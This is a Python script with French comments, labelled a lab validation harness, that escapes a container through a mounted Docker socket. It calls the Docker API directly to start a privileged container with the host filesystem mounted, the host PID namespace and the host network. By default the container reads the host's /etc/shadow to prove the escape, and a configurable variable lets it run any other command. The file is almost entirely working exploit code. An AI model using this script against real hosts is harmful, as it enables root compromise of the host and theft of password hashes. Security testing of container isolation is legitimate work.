#!/usr/bin/env python3
# HARNESS-VALIDATION v2.4.0 — évasion via docker.sock (lab, socket monté rw).
# Corrige audit §3.8 + revue v2.2 :
#   - Cleanup garanti via try/finally
#   - Attente active de l'état "running"
#   - Parsing HTTP robuste + décodage chunked
#   - v2.3 : version API Docker négociée dynamiquement (pas hardcodée v1.41)
#   - v2.3 : décodage Transfer-Encoding: chunked
#   - v2.4 : substitution regex propre du préfixe /v1.xx (au lieu de split fragile)
#   - v2.4 : MAX_BODY_SIZE anti-boucle infinie dans decode_chunked
#   - v2.4 : backoff exponentiel plafonné dans wait_running
#   - v2.4 : attente via API /wait au lieu de sleep(1) fixe
#   - v2.4 : commande conteneur configurable via DOCKER_ESCAPE_CMD
import json
import os
import re
import socket
import time

SOCK = "/var/run/docker.sock"
HTTP_HEADER_RE = re.compile(rb"^HTTP/\d\.\d (\d+) ", re.M)

# v2.4 : commande configurable via env (sans hardcoder la liste Cmd)
CONTAINER_CMD = json.loads(os.environ.get(
    "DOCKER_ESCAPE_CMD",
    '["sh", "-c", "id; head -3 /host/etc/shadow; cat /host/etc/hostname"]'
))

# v2.3 : version API négociée dynamiquement (pas hardcodée)
_API_VERSION = None

def get_api_version() -> str:
    """Négocie la version API Docker au premier appel, cache ensuite."""
    global _API_VERSION
    if _API_VERSION is not None:
        return _API_VERSION
    resp = api("GET", "/version")
    info = extract_json(resp)
    ver = info.get("ApiVersion", "1.41")
    # Docker supporte les versions mineures précédentes : on utilise la majeure
    _API_VERSION = f"v{ver}"
    return _API_VERSION


def api(method: str, path: str, body: dict | None = None) -> bytes:
    """Appel API Docker via socket Unix brut. Retourne la réponse complète.
    v2.3 : la version API est négociée dynamiquement pour les paths versionnés.
    v2.4 : substitution regex propre (remplace /v1.xx par /{API_VERSION})."""
    # v2.4 : substitution propre via regex (remplace /v1.xx par /{API_VERSION}).
    # Lambda replacement : get_api_version() n'est appelée que si la regex matche,
    # évitant une recursion infinie lors du bootstrap (api("GET", "/version")
    # appelé par get_api_version() elle-même). /version ne matche pas ^/v1\.\d+.
    path = re.sub(r'^/v1\.\d+', lambda _m: '/' + get_api_version().lstrip('/'), path)
    b = json.dumps(body).encode() if body else b""
    req = (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(b)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + b
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        s.settimeout(10)
        s.connect(SOCK)
        s.sendall(req)
        data = b""
        while True:
            try:
                chunk = s.recv(8192)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break
        return data
    finally:
        s.close()


MAX_BODY_SIZE = 16 * 1024 * 1024  # 16 MiB plafond


def decode_chunked(data: bytes) -> bytes:
    """Décode un corps HTTP Transfer-Encoding: chunked."""
    out = b""
    pos = 0
    while pos < len(data):
        crlf = data.find(b"\r\n", pos)
        if crlf < 0:
            break
        try:
            size = int(data[pos:crlf], 16)
        except ValueError:
            break
        if size == 0:
            break
        start = crlf + 2
        out += data[start:start + size]
        pos = start + size + 2  # skip data + trailing CRLF
        if len(out) > MAX_BODY_SIZE:  # anti-boucle infinie
            break
    return out


def extract_body(response: bytes) -> bytes:
    """Extrait le corps HTTP après les en-têtes. Décode chunked si nécessaire."""
    sep = response.find(b"\r\n\r\n")
    if sep < 0:
        return b""
    headers = response[:sep].lower()
    body = response[sep + 4:]
    # v2.3 : décoder Transfer-Encoding: chunked
    if b"transfer-encoding: chunked" in headers:
        return decode_chunked(body)
    return body


def extract_json(response: bytes) -> dict:
    """Extrait et parse le JSON de la réponse Docker."""
    body = extract_body(response)
    try:
        return json.loads(body)
    except (json.JSONDecodeError, UnicodeDecodeError):
        return {}


def container_state(cid: str) -> str:
    """Récupère l'état du conteneur."""
    resp = api("GET", f"/v1.41/containers/{cid}/json")
    info = extract_json(resp)
    return info.get("State", {}).get("Status", "unknown")


def wait_running(cid: str, timeout: int = 30) -> bool:
    """Attend que le conteneur atteigne l'état 'running'."""
    t0 = time.time()
    delay = 0.5
    while time.time() - t0 < timeout:
        state = container_state(cid)
        if state == "running":
            return True
        if state == "exited":
            return False
        time.sleep(delay)
        delay = min(delay * 1.5, 2.0)  # backoff exponentiel plafonné
    return False


def parse_docker_logs(raw: bytes) -> bytes:
    """Supprime les en-têtes de frame Docker (8 bytes par frame).
    Format frame : [type:1][0:3][size:4][data]"""
    out = b""
    i = 0
    while i + 8 <= len(raw):
        size = int.from_bytes(raw[i + 4:i + 8], "big")
        if i + 8 + size > len(raw):
            out += raw[i + 8:]
            break
        out += raw[i + 8:i + 8 + size]
        i += 8 + size
    return out


def main():
    # Création du conteneur d'évasion
    create = api("POST", "/v1.41/containers/create", {
        "Image": "alpine",
        "Cmd": CONTAINER_CMD,
        "HostConfig": {
            "Binds": ["/:/host:ro"],
            "Privileged": True,
            "PidMode": "host",
            "NetworkMode": "host",
        },
    })
    create_info = extract_json(create)
    cid = create_info.get("Id")
    if not cid:
        print(json.dumps({
            "module": "docker_escape",
            "error": "container_create_failed",
            "response_head": create[:300].decode(errors="replace"),
        }, indent=2))
        return

    try:
        # Démarrage
        api("POST", f"/v1.41/containers/{cid}/start")
        # Attente active (pas de sleep fixe)
        wait_running(cid, timeout=30)
        # v2.4 : Attendre la fin d'exécution via l'API Docker /wait (pas de sleep fixe)
        api("POST", f"/v1.41/containers/{cid}/wait?condition=not-running")
        # Récupération des logs
        logs_raw = api("GET",
                       f"/v1.41/containers/{cid}/logs?stdout=1&stderr=1")
        logs = parse_docker_logs(extract_body(logs_raw))
        escape_ok = (b"uid=" in logs or b"root:" in logs)
        print(json.dumps({
            "module": "docker_escape",
            "cid": cid[:12],
            "escape_ok": escape_ok,
            "logs": logs.decode(errors="replace")[:500],
        }, indent=2))
    finally:
        # Cleanup GARANTI — le conteneur est toujours supprimé
        try:
            api("DELETE", f"/v1.41/containers/{cid}?force=true&v=true")
        except Exception:
            pass


if __name__ == "__main__":
    main()
